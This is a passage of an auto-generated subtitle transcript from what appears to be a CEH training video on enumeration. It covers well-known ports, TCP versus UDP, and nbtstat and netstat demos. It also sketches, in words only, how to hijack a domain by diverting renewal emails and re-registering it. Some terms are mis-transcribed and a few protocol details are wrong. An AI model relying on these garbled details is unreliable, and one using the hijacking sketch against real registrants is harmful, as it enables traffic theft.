directory.\n\n63\n00:02:43.140 --> 00:02:47.060\nMay be able to stop logging from taking\nplace properly because time stamps will\n\n64\n00:02:47.060 --> 00:02:47.910\nbe screwed up.\n\n65\n00:02:47.910 --> 00:02:52.050\nAll sorts of bad things can happen from\nsomething as simple as essentially saying,\n\n66\n00:02:52.050 --> 00:02:54.640\nyou're ten minutes ahead instead of\nactually being at this particular\n\n67\n00:02:54.640 --> 00:02:55.860\nmoment in time.\n\n68\n00:02:55.860 --> 00:02:59.250\nAnd most of those systems require a five\nminute window for time synchronization.\n\n69\n00:02:59.250 --> 00:03:02.310\nA very, very small buffer for\nus to be out of sync.\n\n70\n00:03:02.310 --> 00:03:06.012\nWindows by default the LDAP active\ndirectory, five minute tolerance for\n\n71\n00:03:06.012 --> 00:03:09.125\ntime synchronization with after that,\n[SOUND] gone.\n\n72\n00:03:09.125 --> 00:03:10.732\nCan you make that noise, [SOUND] gone.\n\n73\n00:03:10.732 --> 00:03:13.540\n>> [SOUND]\n>> Yeah, that's the one, right there.\n\n74\n00:03:13.540 --> 00:03:15.580\nThat's the mark we're true\nsecurity professional right there,\n\n75\n00:03:15.580 --> 00:03:17.750\nis being able to make that sound.\n\n76\n00:03:17.750 --> 00:03:20.110\nForget about being a C.H.\nYou want to be able to do that\n\n77\n00:03:20.110 --> 00:03:20.900\n>> If you do that\n\n78\n00:03:20.900 --> 00:03:22.660\n>> That's what matters, right there.\n\n79\n00:03:22.660 --> 00:03:25.150\nSMTP and DNS: can you guys enumerate that?\n\n80\n00:03:25.150 --> 00:03:27.090\nOf course you can,\nif you know where to look.\n\n81\n00:03:27.090 --> 00:03:30.370\nWe've talked about host headers in one\nof our prior discussions and episodes,\n\n82\n00:03:30.370 --> 00:03:33.660\nshowed you actually in a demonstration\nwhat we can do with host headers.\n\n83\n00:03:33.660 --> 00:03:35.320\nMike was kind enough to demonstrate and\n\n84\n00:03:35.320 --> 00:03:39.070\nuse one of the messages he got to\nshow us what a host header contains.\n\n85\n00:03:39.070 --> 00:03:41.180\nBut also how would you use\nthat to map out source and\n\n86\n00:03:41.180 --> 00:03:44.040\ndestination with regards to\na visual route for sending.\n\n87\n00:03:44.040 --> 00:03:44.980\nSee where it's coming from.\n\n88\n00:03:44.980 --> 00:03:46.840\nSome very valuable information there.\n\n89\n00:03:46.840 --> 00:03:51.330\nDNS, we've talked a lot about Nslookup,\nfor instance, and the use of WHOIS and\n\n90\n00:03:51.330 --> 00:03:53.530\nbe able to find information out there.\n\n91\n00:03:53.530 --> 00:03:56.580\nthat could be used to not only,\nyou know almost without exception,\n\n92\n00:03:56.580 --> 00:03:58.840\nfolks found it from this\nperspective often until now.\n\n93\n00:03:58.840 --> 00:04:01.120\nPay who registered that, what company.\n\n94\n00:04:01.120 --> 00:04:05.230\nWhat about looking at when registration\ntimes are up and taking the domain and\n\n95\n00:04:05.230 --> 00:04:08.265\ngrabbing it from the person that owns\nit because they don't I actually go and\n\n96\n00:04:08.265 --> 00:04:11.680\nre-register it and then,\nessentially, taking them offline,\n\n97\n00:04:11.680 --> 00:04:15.180\nwhich is another form of denial of service\nwhich is becoming more popular today.\n\n98\n00:04:15.180 --> 00:04:16.610\nAnd this, believe it or not, can happen.\n\n99\n00:04:16.610 --> 00:04:19.570\nIf you're not paying attention to\nyour name registration records and\n\n100\n00:04:19.570 --> 00:04:21.160\nknow when they come back up.\n\n101\n00:04:21.160 --> 00:04:24.810\nYes, the actual name registration\nservice will send you an email saying,\n\n102\n00:04:24.810 --> 00:04:27.210\n\"Hey its time to renew.\" But,\nif I go in and\n\n103\n00:04:27.210 --> 00:04:30.870\nmodify that record without your knowledge\nand bounce that email to somebody else.\n\n104\n00:04:30.870 --> 00:04:32.140\nYou're never gonna see it.\n\n105\n00:04:32.140 --> 00:04:35.370\nI'm gonna re-register the domain and\nguess what, I'll change the IP addresses.\n\n106\n00:04:35.370 --> 00:04:37.940\nNow I own it and\nall that traffic's coming to me.\n\n107\n00:04:37.940 --> 00:04:41.620\nSo your customers, by the way,\nand all of that information.\n\n108\n00:04:41.620 --> 00:04:44.360\nNot hard to do,\nif you know where to go and what to do.\n\n109\n00:04:44.360 --> 00:04:46.270\nNumeration, countermeasures,\nwe'll talk about those.\n\n110\n00:04:46.270 --> 00:04:49.290\nSee what's going on there, and\nobviously talk about Some next step, and\n\n111\n00:04:49.290 --> 00:04:51.750\nbest practices, and\nthings that we should be concerned about,\n\n112\n00:04:51.750 --> 00:04:54.290\nas we always try to do\nmaking sure we educate you.\n\n113\n00:04:54.290 --> 00:04:57.420\nAnd you can then turn around and use that\nknowledge to better the networks and\n\n114\n00:04:57.420 --> 00:04:58.310\ndefend them.\n\n115\n00:04:58.310 --> 00:05:00.850\nAnd the networks that you are defending\nhopefully will be the better for it.\n\n116\n00:05:00.850 --> 00:05:03.380\nSo when we think about enumeration,\n\n117\n00:05:03.380 --> 00:05:05.800\nwe're thinking about creating\nactive connections to systems.\n\n118\n00:05:05.800 --> 00:05:09.750\nThis is gonna allow us to stop\nbeing stealthy, and passive, and\n\n119\n00:05:09.750 --> 00:05:11.390\nprobing here and there.\n\n120\n00:05:11.390 --> 00:05:13.520\nTalking to a system quietly.\n\n121\n00:05:13.520 --> 00:05:17.270\nPerhaps intensively if we're do an nmap\nscan that's noisy but in general, just,\n\n122\n00:05:17.270 --> 00:05:19.940\nyou know,\nbeing out there kinda stealthily watching.\n\n123\n00:05:19.940 --> 00:05:21.390\nNow we're gonna actually go and connect.\n\n124\n00:05:21.390 --> 00:05:23.260\nWe do want to be stealthy\ndon't get me wrong.\n\n125\n00:05:23.260 --> 00:05:26.140\nBut we want to try to do so\nwithout raising any red flags.\n\n126\n00:05:26.140 --> 00:05:29.730\nBut we're going to go connect\ndirectly to that file system or that\n\n127\n00:05:29.730 --> 00:05:33.820\ndomain controller, or that message server,\nor whatever it is that we profiled.\n\n128\n00:05:33.820 --> 00:05:39.100\nIn prior steps in the various discussions\nwe've had in foot printing and scanning.\n\n129\n00:05:39.100 --> 00:05:41.970\nNow we're gonna go try to actively\nengaged at system having a one on\n\n130\n00:05:41.970 --> 00:05:43.060\none conversation.\n\n131\n00:05:43.060 --> 00:05:46.440\nSo we're zeroing in, narrowing down\nour focus to find information.\n\n132\n00:05:46.440 --> 00:05:48.640\nThis is really one of the critical\nthings we're gonna do.\n\n133\n00:05:48.640 --> 00:05:50.830\nWe may be doing this on an intranet,\n\n134\n00:05:50.830 --> 00:05:53.930\nmore often than not,\ninternal network to the company.\n\n135\n00:05:53.930 --> 00:05:58.750\nOccasionally, we will do this in\nthe DMZ and the quasi-private area But\n\n136\n00:05:58.750 --> 00:06:01.720\nmore often than not we want to go\nbehind the firewall, behind the IDs.\n\n137\n00:06:01.720 --> 00:06:06.430\nGet in behind all that and look for\ninformation like network resources,\n\n138\n00:06:06.430 --> 00:06:10.250\nnetwork shares, routing tables, SMP and\n\n139\n00:06:10.250 --> 00:06:13.840\nDNS details as we said,\nmachine names, users and\n\n140\n00:06:13.840 --> 00:06:18.450\ngroups, application configurations and\nbanners that are running.\n\n141\n00:06:18.450 --> 00:06:21.520\nAll sorts of stuff is what we want to\nbe able to try to go out and grab.\n\n142\n00:06:21.520 --> 00:06:23.430\nAnd there's quite a bit of it,\nquite honestly,\n\n143\n00:06:23.430 --> 00:06:25.160\nthat we can normally go out and look for.\n\n144\n00:06:25.160 --> 00:06:28.660\nWe've talked about scanning for\nopen ports before and how we can do that.\n\n145\n00:06:28.660 --> 00:06:32.730\nEnumerating is really about, as much\nas anything else, understanding what\n\n146\n00:06:32.730 --> 00:06:37.120\nports are running and then equating those\nports with services that will then tell us\n\n147\n00:06:37.120 --> 00:06:40.800\nwhat kind of service profile and what kind\nof operating system We may have on there.\n\n148\n00:06:40.800 --> 00:06:41.500\nCan you do me a favor?\n\n149\n00:06:41.500 --> 00:06:43.070\n>> Sure.\n>> Could we take a little trip before we\n\n150\n00:06:43.070 --> 00:06:44.880\ngo to Mike's machine,\njust let him get set up.\n\n151\n00:06:44.880 --> 00:06:47.210\nCan we go out and\ncan we pull up somewhere,\n\n152\n00:06:47.210 --> 00:06:48.950\nI don't really care where you go to,\nIon or wherever.\n\n153\n00:06:48.950 --> 00:06:51.910\nJust bring up a listing of the common,\nthe well known ports.\n\n154\n00:06:51.910 --> 00:06:52.750\n>> Sure.\n>> The first 1,023.\n\n155\n00:06:52.750 --> 00:06:55.840\nOr at least bring up a reference to them\nthat we could just talk about quickly and\n\n156\n00:06:55.840 --> 00:06:57.920\nshow people what those may be.\n\n157\n00:06:57.920 --> 00:06:59.280\nWe'll give Mike a second.\n\n158\n00:06:59.280 --> 00:07:01.580\nAnd Google for\nthat cuz we didn't plan for this one.\n\n159\n00:07:01.580 --> 00:07:04.970\nThis is a spur of the moment\nspecial brought to you by [COUGH]\n\n160\n00:07:04.970 --> 00:07:06.338\nCreativeThinking.com.\n\n161\n00:07:06.338 --> 00:07:08.070\n>> [LAUGH]\n>> So as we're going through and\n\n162\n00:07:08.070 --> 00:07:10.780\ntalking about various ports,\nports to remember, ports to know,\n\n163\n00:07:10.780 --> 00:07:12.580\nwhat would you want to know for the exam.\n\n164\n00:07:12.580 --> 00:07:16.130\nWe often will see questions on many exams,\nnot just on this exam but\n\n165\n00:07:16.130 --> 00:07:20.050\nall sorts Of vendor exams about port\nnumbers and knowing what they are.\n\n166\n00:07:20.050 --> 00:07:22.700\nSo I've got a little port reference\nhere that may be helpful.\n\n167\n00:07:22.700 --> 00:07:24.070\nThis is from Microsoft,\n\n168\n00:07:24.070 --> 00:07:28.160\nI'm guessing just based on the cut\nof that website that I see there.\n\n169\n00:07:28.160 --> 00:07:29.228\n>> You recognize that?\n\n170\n00:07:29.228 --> 00:07:30.200\n[LAUGH]\n>> TechNet ahoy.\n\n171\n00:07:30.200 --> 00:07:33.290\n>> And so we do have a list of\nsome well-known ports there.\n\n172\n00:07:33.290 --> 00:07:35.530\nObviously valuable for us to think about.\n\n173\n00:07:35.530 --> 00:07:38.700\nPorts like port 53, which will hopefully\n\n174\n00:07:38.700 --> 00:07:41.960\nbe a port that stands out in everybody's\nreference, that will be DNS.\n\n175\n00:07:41.960 --> 00:07:45.000\nPerhaps port 135 since we're\non the Microsoft website,\n\n176\n00:07:45.000 --> 00:07:47.340\nthat's the RPC endpoint mapper.\n\n177\n00:07:47.340 --> 00:07:47.860\nPort 137.\n\n178\n00:07:47.860 --> 00:07:50.060\nThe NetBIOS name service.\n\n179\n00:07:50.060 --> 00:07:51.140\nPort 139.\n\n180\n00:07:51.140 --> 00:07:52.610\nNetBIOS session service.\n\n181\n00:07:52.610 --> 00:07:55.430\nNot to be confused with 137 and 135.\n\n182\n00:07:55.430 --> 00:07:57.017\nPeople often cross-wire those.\n\n183\n00:07:57.017 --> 00:07:58.648\nHow about 445?\n\n184\n00:07:58.648 --> 00:07:59.645\nSMB.\n\n185\n00:07:59.645 --> 00:08:00.808\nServer Message Block over TCP.\n\n186\n00:08:00.808 --> 00:08:03.497\nThat's direct host communication.\n\n187\n00:08:03.497 --> 00:08:07.235\nPort 161 snmb very good and\ncommon one you may or\n\n188\n00:08:07.235 --> 00:08:12.753\nmay not have bypassed that one\nalready Port 389 ldap, port 3268,\n\n189\n00:08:12.753 --> 00:08:17.737\nglobal catalog, port 25 sntb\ngeneric not specific Microsoft,\n\n190\n00:08:17.737 --> 00:08:23.530\nport 162 snmp traps, port 161 SNMP,\nbut port 162 for traps.\n\n191\n00:08:23.530 --> 00:08:28.310\nWe've got port 21 for FTP, I'm sure\nRob would be on that list as well.\n\n192\n00:08:28.310 --> 00:08:31.570\nPort 80 I hopefully don't have\nto tell you what that one is.\n\n193\n00:08:31.570 --> 00:08:34.100\nPort 443 it's secure cousin right?\n\n194\n00:08:34.100 --> 00:08:38.140\nSo HTTP on port 80, HTTPS on port 443.\n\n195\n00:08:38.140 --> 00:08:40.230\nThere's a whole bunch of these.\n\n196\n00:08:40.230 --> 00:08:42.250\nPort 143, port 110, for instance.\n\n197\n00:08:42.250 --> 00:08:44.910\nRight?\nSo POP and IMAP and things like that.\n\n198\n00:08:44.910 --> 00:08:47.260\nWe wanna make sure that we\nare aware of these ports.\n\n199\n00:08:47.260 --> 00:08:50.485\nCommon ones are gonna be very\nimportant for you to have.\n\n200\n00:08:50.485 --> 00:08:54.505\nHave knowledge of and to understand,\nyou may wanna throw Microsoft's SQL\n\n201\n00:08:54.505 --> 00:08:57.165\nserver in there as well,\nwould be another good one to know.\n\n202\n00:08:57.165 --> 00:09:01.875\nRemote Desktop, so things like\n3389 would be important to know.\n\n203\n00:09:01.875 --> 00:09:05.362\nSo there's a whole bunch and you can\nobviously go out and find lists and\n\n204\n00:09:05.362 --> 00:09:08.612\nlists and lists of them, I'm not\nsuggestion you memorize the first 1,023\n\n205\n00:09:08.612 --> 00:09:12.212\nports, what I am pointing out is there's\nprobably about 20 to 30 that should be\n\n206\n00:09:12.212 --> 00:09:16.951\ncommon knowledge and you should be aware\nof, and would be very valuable for you\n\n207\n00:09:16.951 --> 00:09:21.891\nto make sure you are able to equate with a\nservice if asked, let me put it that way.\n\n208\n00:09:21.891 --> 00:09:25.761\nMeaning, somebody said to you,\nhey, what runs on port number 25?\n\n209\n00:09:25.761 --> 00:09:28.421\nHopefully you know it's SMTP.\n\n210\n00:09:28.421 --> 00:09:30.730\nSomebody says to you,\nwhat runs on port 162.\n\n211\n00:09:30.730 --> 00:09:34.720\nYou should hopefully know\nit's the SNMP trap service.\n\n212\n00:09:34.720 --> 00:09:36.520\nSo it'll be important to know that.\n\n213\n00:09:36.520 --> 00:09:38.540\nBy the way, we often protocols.\n\n214\n00:09:38.540 --> 00:09:40.100\nNot often, we do.\n\n215\n00:09:40.100 --> 00:09:41.720\nProtocols that are mapped to those ports.\n\n216\n00:09:41.720 --> 00:09:46.580\nMeaning, for instance, on port 25 with\nSMTP that's gonna be running on TCP.\n\n217\n00:09:46.580 --> 00:09:49.020\nThe underlying protocol is TCP.\n\n218\n00:09:49.020 --> 00:09:54.340\nWith port 162, when we're talking about\nthe SNMP trap service we're talking about\n\n219\n00:09:54.340 --> 00:09:58.760\nboth TCP and UDP, being it so\nwe have to understand and know that.\n\n220\n00:09:58.760 --> 00:10:01.700\nThat would be a subtle but\nimportant distinction that you may wanna\n\n221\n00:10:01.700 --> 00:10:06.290\nbe responsible for if you are planning on\nbecoming a CEH at some point in the future\n\n222\n00:10:06.290 --> 00:10:09.410\nby taking the exam, because there\nreally is no other way to become a CH.\n\n223\n00:10:09.410 --> 00:10:11.480\nSo of course, you would wanna know that.\n\n224\n00:10:11.480 --> 00:10:15.350\nNow this brings up an interesting point\nwhich is hopefully common knowledge for\n\n225\n00:10:15.350 --> 00:10:17.360\neverybody watching but\nwe never wanna make assumptions.\n\n226\n00:10:17.360 --> 00:10:18.460\nWe just wanna make sure.\n\n227\n00:10:18.460 --> 00:10:20.720\nEven if it's something that's\nrelatively straight forward,\n\n228\n00:10:20.720 --> 00:10:22.550\nwe spend at least a minute\nacknowledging it and\n\n229\n00:10:22.550 --> 00:10:24.580\njust discussing to make sure\nyou're comfortable with it.\n\n230\n00:10:24.580 --> 00:10:27.590\nSo, Mike help me to talk about\nthe difference between TCP and\n\n231\n00:10:27.590 --> 00:10:32.730\nUDP from the protocol perspective, meaning\nthere is a very subtle but distinct and\n\n232\n00:10:32.730 --> 00:10:35.330\nimportant difference between these two\nprotocols in terms of how they operate,\n\n233\n00:10:35.330 --> 00:10:39.890\nso let's educate our clientele out\nthere and talk about what it is quick.\n\n234\n00:10:39.890 --> 00:10:42.010\n>> The way if you wanna sum it up and\ndo a couple of words,\n\n235\n00:10:42.010 --> 00:10:46.230\nTCP is connection oriented\nwhereas UDP is connection lesson.\n\n236\n00:10:46.230 --> 00:10:47.890\nIt just means that with TCP,\n\n237\n00:10:47.890 --> 00:10:51.280\nthere's a connection established between\nthe sending and receiving end, right?\n\n238\n00:10:51.280 --> 00:10:54.560\nThey go through that three way handshake,\nthe sin, the sin act, and the act.\n\n239\n00:10:54.560 --> 00:10:57.060\nThey've established a connection and\n\n240\n00:10:57.060 --> 00:11:00.000\nthe packets are checked when\nthey get to the other end.\n\n241\n00:11:00.000 --> 00:11:03.172\nThey're verified and\nthere is a check sum in there.\n\n242\n00:11:03.172 --> 00:11:06.340\nIf they're corrupted in any way or\nmodified in anyway and\n\n243\n00:11:06.340 --> 00:11:08.150\nthe check sum doesn't match,\nthey'll ask for\n\n244\n00:11:08.150 --> 00:11:11.250\nthose packages that get dropped and\nthey'll have them resent.\n\n245\n00:11:11.250 --> 00:11:13.770\nI mean as where with UDP,\nit's a send and forget.\n\n246\n00:11:13.770 --> 00:11:17.070\nIt's not connection oriented,\nit's what we call connection-less.\n\n247\n00:11:17.070 --> 00:11:20.510\nSo, those packets are sent and\nthen it's just, I hope they get there.\n\n248\n00:11:20.510 --> 00:11:25.100\nI don't really care, you know, on my end,\nI've sent them, I've done my job.\n\n249\n00:11:26.160 --> 00:11:30.210\nThere's no checking to make sure and\nasking for\n\n250\n00:11:30.210 --> 00:11:32.650\nresends, or anything like that with UDP.\n\n251\n00:11:32.650 --> 00:11:37.130\nTCP, connection oriented, connection\nis established, backers are checked.\n\n252\n00:11:37.130 --> 00:11:39.180\nUDP, connectionless.\n\n253\n00:11:39.180 --> 00:11:40.920\nSo we could say as I come back.\n\n254\n00:11:40.920 --> 00:11:44.190\n>> As I working on the lab machine for\na second, I don't wanna be over here,\n\n255\n00:11:44.190 --> 00:11:46.620\ncuz I get accused of being\nout of frame when I do that.\n\n256\n00:11:46.620 --> 00:11:49.830\nSo we could say, and Mike did\nan excellent job of summarizing it,\n\n257\n00:11:49.830 --> 00:11:51.405\njust to make it even just more simple.\n\n258\n00:11:51.405 --> 00:11:52.945\nSimple, real simple.\n\n259\n00:11:52.945 --> 00:11:56.267\nHe did this by starting out and\ntalking about it, then he expounded.\n\n260\n00:11:56.267 --> 00:11:59.505\nTCP-oriented, UDP-connectionless.\n\n261\n00:11:59.505 --> 00:12:02.025\nWe often see TCP means send and\nacknowledge, and\n\n262\n00:12:02.025 --> 00:12:04.240\nMike explained the three-way handshake.\n\n263\n00:12:04.240 --> 00:12:08.290\nAnd we often say UDP means send and forget\nbecause we don't do the acknowledgement,\n\n264\n00:12:08.290 --> 00:12:09.370\nthere is no three way handshake.\n\n265\n00:12:09.370 --> 00:12:11.180\nSo, I wanna make sure we're\ncomfortable with that and\n\n266\n00:12:11.180 --> 00:12:14.550\nwe think about that because that's a great\nway of thinking about the difference here,\n\n267\n00:12:14.550 --> 00:12:17.900\nand as we talk about some of those ports\nand those protocols, some have both\n\n268\n00:12:17.900 --> 00:12:21.420\nacknowledge and acknowledged\ncommunications and no acknowledgement.\n\n269\n00:12:21.420 --> 00:12:22.730\nOthers are simply just streaming.\n\n270\n00:12:22.730 --> 00:12:23.930\nNo acknowledgement at all.\n\n271\n00:12:23.930 --> 00:12:28.040\nWe often see UDP being used with streaming\nmedia systems, desktop imaging, and\n\n272\n00:12:28.040 --> 00:12:29.870\nthings like that where\nwe are sending bits.\n\n273\n00:12:29.870 --> 00:12:32.610\nThen we are thinking about things\nthat require acknowledgement\n\n274\n00:12:32.610 --> 00:12:34.540\nas having a TCP based connection.\n\n275\n00:12:34.540 --> 00:12:36.700\nGreat job in terms of helping us\nthrough helping us examine that.\n\n276\n00:12:36.700 --> 00:12:37.260\nThank you.\n\n277\n00:12:37.260 --> 00:12:38.530\nCan we go to the lab machine?\n\n278\n00:12:38.530 --> 00:12:40.170\nThe lab machine will be the other machine.\n\n279\n00:12:40.170 --> 00:12:41.450\nNot Mike's machine but the other one.\n\n280\n00:12:41.450 --> 00:12:42.320\nThat one.\nThank you very much.\n\n281\n00:12:42.320 --> 00:12:44.780\nJust want to make sure,\nwe take a look at something or\n\n282\n00:12:44.780 --> 00:12:47.710\nyou can take me out of the window,\nthe screen in screen cuz I'm gonna be off.\n\n283\n00:12:47.710 --> 00:12:50.370\nYeah cuz I'm gonna be way out\nof the picture there anyway.\n\n284\n00:12:50.370 --> 00:12:53.280\nYou're gonna see half my face talking and\nnot gonna be able to see anything else.\n\n285\n00:12:53.280 --> 00:12:57.870\nSince we're talking about connection lists\nand connection oriented and we're talking.\n\n286\n00:12:57.870 --> 00:12:58.820\nAbout how this stuff works.\n\n287\n00:12:58.820 --> 00:13:01.490\nActually just wanna change the background\non this while we're doing this, so\n\n288\n00:13:01.490 --> 00:13:02.670\nyou can see this a little bit easier.\n\n289\n00:13:02.670 --> 00:13:05.010\nLet me just change the color here.\n\n290\n00:13:05.010 --> 00:13:06.020\nI forgot to do that.\n\n291\n00:13:06.020 --> 00:13:07.980\nBut let's do Screen Background white.\n\n292\n00:13:07.980 --> 00:13:10.845\nLet's do Screen Text white, so\nyou really can't see anything at all.\n\n293\n00:13:10.845 --> 00:13:12.270\n>> [LAUGH]\n>> We'll navigate with the force.\n\n294\n00:13:12.270 --> 00:13:15.740\nI'm gonna do white on blue, and I'm also\ngonna go ahead and I'm gonna do this.\n\n295\n00:13:15.740 --> 00:13:22.150\nI'm just gonna make the font size a little\nbit bigger here, just so we can see that.\n\n296\n00:13:22.150 --> 00:13:23.370\nLet me do this.\n\n297\n00:13:23.370 --> 00:13:25.130\nThat may be a little bit easier for\nyou to see.\n\n298\n00:13:25.130 --> 00:13:28.310\nWhat I want to do is I just want to talk\nabout the difference between NETSTAT and\n\n299\n00:13:28.310 --> 00:13:29.360\nNBTSTAT.\n\n300\n00:13:29.360 --> 00:13:32.260\nJust to talk about BIOS\nenumeration a little bit.\n\n301\n00:13:32.260 --> 00:13:36.050\nOne of the things we were talking about\nis the way in which we can enumerate\n\n302\n00:13:36.050 --> 00:13:37.270\ndifferent things.\n\n303\n00:13:37.270 --> 00:13:41.600\nNBT STAT is going to allow us to be\nable to see that BIOS connections.\n\n304\n00:13:41.600 --> 00:13:45.550\nThere is a whole list of switches.\n\n305\n00:13:45.550 --> 00:13:48.810\nNBT STAT, it would help if I\ntyped that correctly, of course.\n\n306\n00:13:48.810 --> 00:13:52.490\nOf course NB STAT is not recognized,\nI don't get to make up my own tools here.\n\n307\n00:13:52.490 --> 00:13:56.370\nIf we do NBT STAT, then we do a slash\nquestion mark, forward slash,\n\n308\n00:13:56.370 --> 00:13:58.120\nquestion mark,\nwe can always look at the Help file.\n\n309\n00:13:58.120 --> 00:14:01.870\nThere is some Case Sensitivity here,\nlower case a, upper case A for\n\n310\n00:14:01.870 --> 00:14:05.760\nadaptor, and one gives us adaptor\non the remote machine name,\n\n311\n00:14:05.760 --> 00:14:08.460\nthe other gives us that\nplus the IP address.\n\n312\n00:14:08.460 --> 00:14:11.328\nC for cache, you want to have\na look at that, so if we do,\n\n313\n00:14:11.328 --> 00:14:15.450\nMBT stat minus C, and\nwe look at the cache,\n\n314\n00:14:15.450 --> 00:14:19.880\nwe're going to see that BIOS information\nin the cache with regards to enumerating\n\n315\n00:14:19.880 --> 00:14:22.950\nany remote connectivity for\nthe machines that may be out there.\n\n316\n00:14:22.950 --> 00:14:24.040\nBut if there is nothing.\n\n317\n00:14:24.040 --> 00:14:24.790\nAnd right now there isn't.\n\n318\n00:14:24.790 --> 00:14:26.100\nI haven't been out and surfed the web or\n\n319\n00:14:26.100 --> 00:14:28.220\ndone anything in some\ntime on this machine.\n\n320\n00:14:28.220 --> 00:14:30.950\nWe're just using it as a jump\nbox essentially to go in and\n\n321\n00:14:30.950 --> 00:14:32.725\ndo the lab environment, right?\n\n322\n00:14:32.725 --> 00:14:33.980\n>> Mm-hm.\n>> We're essentially.\n\n323\n00:14:33.980 --> 00:14:34.680\nWhat is it?\n\n324\n00:14:34.680 --> 00:14:35.310\nGo to my PC.\n\n325\n00:14:35.310 --> 00:14:36.620\n>> Yeah.\n>> Seeing right out of here\n\n326\n00:14:36.620 --> 00:14:37.320\nthrough web connections.\n\n327\n00:14:37.320 --> 00:14:39.970\nIt's probably not gonna see anything\nthere, but if I connect out or\n\n328\n00:14:39.970 --> 00:14:43.720\nI ping something on the network, I'll\nsee a net bios connection out here and\n\n329\n00:14:43.720 --> 00:14:45.150\nI'll start to see some information.\n\n330\n00:14:45.150 --> 00:14:46.480\nWhat's your IP address there?\n\n331\n00:14:46.480 --> 00:14:48.935\nWanna just tell me that real\nquick Find out, 10.1.230-\n\n332\n00:14:48.935 --> 00:14:49.610\n>> And .1.230.\n\n333\n00:14:49.610 --> 00:14:52.690\n>> The last one I have to double check.\n\n334\n00:14:52.690 --> 00:14:58.130\n>> I'll just do .1,\nwe know the gateways is up.\n\n335\n00:14:58.130 --> 00:14:59.640\n>> Yeah, okay.\n>> I'll do .1, it's no big deal.\n\n336\n00:14:59.640 --> 00:15:00.620\nWe'll do that.\n\n337\n00:15:00.620 --> 00:15:04.190\nAnd then if I do that I may or\nmay not get a NetBIOS connection.\n\n338\n00:15:04.190 --> 00:15:05.200\nThat's a gateway device.\n\n339\n00:15:05.200 --> 00:15:06.390\nI'm probably not gonna see anything there.\n\n340\n00:15:06.390 --> 00:15:12.240\nBut If I go out and\nI browse to a web site,\n\n341\n00:15:12.240 --> 00:15:17.245\nand I go to, we got on here-\n>> And I'm 141.\n\n342\n00:15:17.245 --> 00:15:19.990\n>> TechNet.Microsoft.com,\nlet me

that.\n\n345\n00:15:23.725 --> 00:15:24.370\n>> [LAUGH]\n>> So\n\n346\n00:15:24.370 --> 00:15:26.500\nthere's one of the sayings these days,\nis you now.\n\n347\n00:15:26.500 --> 00:15:28.760\nI'm only kidding,\nI'm just being silly for no good reason.\n\n348\n00:15:28.760 --> 00:15:33.740\nBut let's bring up nbtstat, and then I\nmay be able to start adding in some stuff\n\n349\n00:15:33.740 --> 00:15:38.666\nin my cache got a little bigger there,\n\n350\n00:15:38.666 --> 00:15:43.640\nbut I do not have anything\ndisplaying in there yet because\n\n351\n00:15:43.640 --> 00:15:46.890\nI am not actually resolving anything\nthat I'm actively going out and using.\n\n352\n00:15:46.890 --> 00:15:50.200\nI am already using other\nname resolution nets.\n\n353\n00:15:50.200 --> 00:15:51.651\nI am not using net bios.\n\n354\n00:15:51.651 --> 00:15:54.747\nI would have to connect to a machine\non the network maybe go in and\n\n355\n00:15:54.747 --> 00:15:57.377\nyou'll connect to users\nshare to see information and\n\n356\n00:15:57.377 --> 00:15:59.673\nthen if Mike how to share and\nI connected to it.\n\n357\n00:15:59.673 --> 00:16:01.910\nI'd actually start see\nthat information show up.\n\n358\n00:16:01.910 --> 00:16:03.892\nSo, when we think about net BIOS, right.\n\n359\n00:16:03.892 --> 00:16:08.548\nWe're thinking about a connection solution\nwe use typically on the LAN internally,\n\n360\n00:16:08.548 --> 00:16:12.687\nto connect to a resource that may then\nshow us information about the nature of\n\n361\n00:16:12.687 --> 00:16:13.477\nthe machine.\n\n362\n00:16:13.477 --> 00:16:16.515\nBut enumerating that BIOS from outside\nprobably doesn't do us any good,\n\n363\n00:16:16.515 --> 00:16:19.662\ncuz we're normally not gonna connect\nto a machine using that methodology.\n\n364\n00:16:19.662 --> 00:16:23.388\nBut we have another tool that we could\nuse that may be helpful as well,\n\n365\n00:16:23.388 --> 00:16:24.880\nwhich is netstat, right?\n\n366\n00:16:24.880 --> 00:16:29.340\nAnd netstat shows us network statistics,\nand shows us connections,\n\n367\n00:16:29.340 --> 00:16:31.920\nport information, all sorts of stuff.\n\n368\n00:16:31.920 --> 00:16:35.796\nAnd so again, just to explain\nthe help file before we do anything,\n\n369\n00:16:35.796 --> 00:16:39.672\nif we do netstat and we take a look\nat the connection on the adapter,\n\n370\n00:16:39.672 --> 00:16:43.640\nwe’ll see that we have a bunch of\nopen connections and ports there.\n\n371\n00:16:43.640 --> 00:16:46.854\nAnd we see that a lot of them are in a\nstate of listening, and then we have some,\n\n372\n00:16:46.854 --> 00:16:48.288\nthose are the Skype connections,\n\n373\n00:16:48.288 --> 00:16:50.531\ncuz we have Skype running\non this box I guess, right?\n\n374\n00:16:50.531 --> 00:16:53.145\nYou guys have it running for\nyour instant messaging, and\n\n375\n00:16:53.145 --> 00:16:54.896\nthen we got some other stuff in there.\n\n376\n00:16:54.896 --> 00:16:57.598\nConnecting out over the Web\nare various protocols and\n\n377\n00:16:57.598 --> 00:16:59.886\nvarious IP addresses to\na variety of things.\n\n378\n00:16:59.886 --> 00:17:02.776\nIt's a little slow to build,\nbecause we've got a lot of traffic coming\n\n379\n00:17:02.776 --> 00:17:04.670\nthrough that remote\nportal going into the VM.\n\n380\n00:17:04.670 --> 00:17:06.490\nSo we're gonna see a lot of that, but\n\n381\n00:17:06.490 --> 00:17:09.018\nyou can see it just dumped a whole\nbunch of additional stuff in there.\n\n382\n00:17:09.018 --> 00:17:12.100\nAnd I've actually got a lot going on\nin this machine as you can see, but\n\n383\n00:17:12.100 --> 00:17:14.690\nI'm not actually using that BIOS to do it,\nright?\n\n384\n00:17:14.690 --> 00:17:17.450\nI'm using other protocols and\nother connection methods to do it.\n\n385\n00:17:17.450 --> 00:17:20.320\nIf you set up a share,\nI'd be able to connect into that share and\n\n386\n00:17:20.320 --> 00:17:22.000\nthen we could see something\nlike that as well.\n\n387\n00:17:22.000 --> 00:17:23.750\nSo, yo, don't underestimate.\n\n388\n00:17:23.750 --> 00:17:24.455\nMy point is,\n\n389\n00:17:24.455 --> 00:17:28.953\ndon't underestimate some of these tools\nthat we have that we're natively using.\n\n390\n00:17:28.953 --> 00:17:32.153\nWe can come back and just take a look\nat me, cuz I wanna smile on camera,\n\n391\n00:17:32.153 --> 00:17:33.694\nand say hi to everybody, hello.\n\n392\n00:17:33.694 --> 00:17:34.776\n>> [LAUGH]\n>> How's everybody doing?\n\n393\n00:17:34.776 --> 00:17:38.407\nSo we don't wanna 